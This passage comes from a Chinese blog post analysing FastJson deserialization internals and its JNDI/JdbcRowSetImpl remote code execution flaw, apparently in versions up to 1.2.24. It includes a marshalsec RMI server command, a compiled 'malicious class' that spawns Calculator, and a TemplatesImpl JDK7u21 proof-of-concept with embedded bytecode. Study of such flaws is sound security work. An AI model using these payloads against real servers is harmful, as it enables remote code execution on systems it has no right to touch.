<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson,util.JavaBeanInfo:build</span></span><br><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">"set"</span>)) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">"get"</span>)) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随后通过<code>ASM</code>生成<code>derializer</code>(处理类)：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">createJavaBeanDeserializer</span><span class="params">(ParserConfig config, JavaBeanInfo beanInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clazz = beanInfo.clazz;</span><br><span class="line">    <span class="keyword">if</span> (clazz.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"not support type :"</span> + clazz.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String className = <span class="string">"FastjsonASMDeserializer_"</span> + <span class="keyword">this</span>.seed.incrementAndGet() + <span class="string">"_"</span> + clazz.getSimpleName();</span><br><span class="line">        String packageName = ASMDeserializerFactory<span class="class">.<span class="keyword">class</span>.<span class="title">getPackage</span>().<span class="title">getName</span>()</span>;</span><br><span class="line">        String classNameType = packageName.replace(<span class="string">'.'</span>, <span class="string">'/'</span>) + <span class="string">"/"</span> + className;</span><br><span class="line">        String classNameFull = packageName + <span class="string">"."</span> + className;</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter();</span><br><span class="line">        cw.visit(49, 33, classNameType, ASMUtils.type(JavaBeanDeserializer.class), (String[])null);</span><br><span class="line">        <span class="keyword">this</span>._init(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">this</span>._createInstance(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">this</span>._deserialze(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">5</span>));</span><br><span class="line">        <span class="keyword">this</span>._deserialzeArrayMapping(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">byte</span>[] code = cw.toByteArray();</span><br><span class="line">        Class&lt;?&gt; exampleClass = <span class="keyword">this</span>.defineClassPublic(classNameFull, code, <span class="number">0</span>, code.length);</span><br><span class="line">        Constructor&lt;?&gt; constructor = exampleClass.getConstructor(ParserConfig<span class="class">.<span class="keyword">class</span>, <span class="title">JavaBeanInfo</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        Object instance = constructor.newInstance(config, beanInfo);</span><br><span class="line">        <span class="comment">//生成了处理类并返回</span></span><br><span class="line">        <span class="keyword">return</span> (ObjectDeserializer)instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来进入重点，回到最开始的<code>parseObject()</code>方法中，我们已经创建了<code>deserializer</code>，接下来是通过<code>deserializer</code>对类进行反序列化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过上述步骤，已经创建了deserializer，用于反序列化clazz</span></span><br><span class="line">ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line"><span class="comment">//对clazz进行反序列化，并结合传入的json数据的其他字段对类进行加载</span></span><br><span class="line">thisObj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p>在<code>com.alibaba.fastjson.parser.deserializer:JavaBeanDeserializer:deserialze</code>中将继续解析传入的Json数据，并根据json数据对指定的类进行加载，调用<code>setvalue()</code>方法改变类中的变量，这些动作通过下面的代码来实现，此时key为我们传入的json中的key，object为经过反序列化的<code>JdbcRowSetImpl</code>类的实例，<code>type</code>为<code>JdbcRowSetImpl</code>类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.deserializer:JavaBeanDeserializer:deserialze</span></span><br><span class="line"><span class="keyword">boolean</span> match = <span class="keyword">this</span>.parseField(parser, key, object, type, fieldValues);</span><br></pre></td></tr></table></figure>
<p>接下来会在<code>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer:parseField</code>中继续解析并提取value字段，并调用<code>setValue</code>方法，进行变量的修改，关键代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer:parseField</span></span><br><span class="line">value = javaBeanDeser.deserialze(parser, fieldType, <span class="keyword">this</span>.fieldInfo.name, <span class="keyword">this</span>.fieldInfo.parserFeatures);</span><br><span class="line"><span class="keyword">this</span>.setValue(object, value);</span><br></pre></td></tr></table></figure>
<p>在<code>setValue</code>方法中将通过反射的方式调用类中的方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.deserializer.FieldDeserializer:setValue</span></span><br><span class="line">method.invoke(object, value);</span><br></pre></td></tr></table></figure>

<p>到这里为之我们已经详细描述了JSON数据解析到反射调用方法的过程，如果存在可被利用的类，那么我们可以将该类名以及需要的参数发送给服务端导致RCE。</p>
<p>看一下从收到Json数据到触发方法调用的调用栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setDataSourceName:4298, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:91, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:722, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:568, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:865, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:183, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:355, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1312, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1278, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:201, JSON (com.alibaba.fastjson)</span><br><span class="line">main:64, Main (com.company)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">connect:634, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:91, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:722, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:568, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:865, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:183, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:355, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1312, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1278, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:201, JSON (com.alibaba.fastjson)</span><br><span class="line">main:64, Main (com.company)</span><br></pre></td></tr></table></figure>
<h2 id="lt-12-2-24"><a href="#lt-12-2-24" class="headerlink" title="&lt;=12.2.24"></a>&lt;=12.2.24</h2><h3 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h3><ol>
<li>使用marshalsec起一个RMI服务器<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <a href="http://127.0.0.1/#exp18" target="_blank" rel="noopener">http://127.0.0.1/#exp18</a> 1099</li>
<li>写一个恶意类并编译   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp18</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">exp18</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>本地开启HTTP服务器，将编译过的恶意类放到web目录下，对应步骤一中的路径。</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>反序列化流程在上文已经详述，这里看漏洞的几个关键点：</p>
<ol>
<li>通过传递<code>dataSourceName</code>参数，触发反射调用<code>setDataSourceName</code>，将远程地址修改为<code>rmi:127.0.0.1/exp</code></li>
<li>通过传递<code>autoCommit</code>参数，触发反射调用<code>setAutoCommit</code>，并执行<code>connect</code>函数<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>在<code>connect</code>函数中，我们看到了熟悉的函数<code>lookup</code>，说明这里是通过jndi的方式进行远程数据库的连接，而此时<code>this.getDataSourceName</code>已经被我们设置为<code>rmi:127.0.0.1/exp</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随后就是请求RMI，获取到<code>http://127.0.0.1/#exp18</code>，并通过<code>com.sun.jndi.rmi.Registry.RegistryContext:decodeObject</code>来从HTTP服务器上下载exp18，后续的流程与JNDI一致这里不再叙述。  </p>
<p>PS：jdk 1.8u191之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//dk 1.8u191之后版本存在trustCodebaseURL的限制，这里会报错trustURLCodebase为false</span></span><br><span class="line">    <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">    <span class="keyword">throw</span> var5;</span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">    NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">    var4.setRootCause(var7);</span><br><span class="line">    <span class="keyword">throw</span> var4;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&lt;=12.2.24还有一个利用方式，即基于JDK1.7u21的gadgets，利用原理与上文相同，同样是利用反序列化走道了JDK原生的类，这里建议重点看一看ysoserial的JDK1.7u21这个payload，不过现在JDK1.7u21已经用的非常少了，关于这个gadget的详细分析见<code>参考3</code>，这里直接给出POC：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADMAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARsYWxhAQAMSW5uZXJDbGFzc2VzAQAcTOeJiOacrDI0L2pkazd1MjFfbWluZSRsYWxhOwEAClNvdXJjZUZpbGUBABFqZGs3dTIxX21pbmUuamF2YQwABAAFBwATAQAa54mI5pysMjQvamRrN3UyMV9taW5lJGxhbGEBABBqYXZhL2xhbmcvT2JqZWN0AQAV54mI5pysMjQvamRrN3UyMV9taW5lAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAFQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABcAGAoAFgAZAQAEY2FsYwgAGwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAB0AHgoAFgAfAQARTGFMYTg4MTIwNDQ1NzYzMDABABNMTGFMYTg4MTIwNDQ1NzYzMDA7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAADwAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"</span>],<span class="string">'_name'</span>:<span class="string">'a.b'</span>,<span class="string">'_tfactory'</span>:&#123; &#125;,<span class="string">'_outputProperties'</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure>


<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://paper.seebug.org/994/#11-defaultjsonparser" target="_blank" rel="noopener">https://paper.seebug.org/994/#11-defaultjsonparser</a></li>
<li><a href="https://xz.aliyun.com/t/7027#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7027#toc-4</a></li>
<li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></li>
</ol>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/homerqing" target="_blank" rel="noopener">Github</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson反序列化原理"><span class="toc-number">2.</span> <span class="toc-text">FastJson反序列化原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson中序列化和反序列化的方法"><span class="toc-number">3.</span> <span class="toc-text">FastJson中序列化和反序列化的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试过程"><span class="toc-number">4.</span> <span class="toc-text">调试过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进入反序列化的过程"><span class="toc-number">5.</span> <span class="toc-text">进入反序列化的过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lt-12-2-24"><span class="toc-number">6.</span> <span class="toc-text">&lt;&#x3D;12.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境准备："><span class="toc-number">6.1.</span> <span class="toc-text">环境准备：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/" target="_blank" rel="noopener"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&text=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&is_video=false&description=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson/FastJson反序列化过程拆解&body=Check out this article: http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&name=fastjson/FastJson反序列化过程拆解&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Homer
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
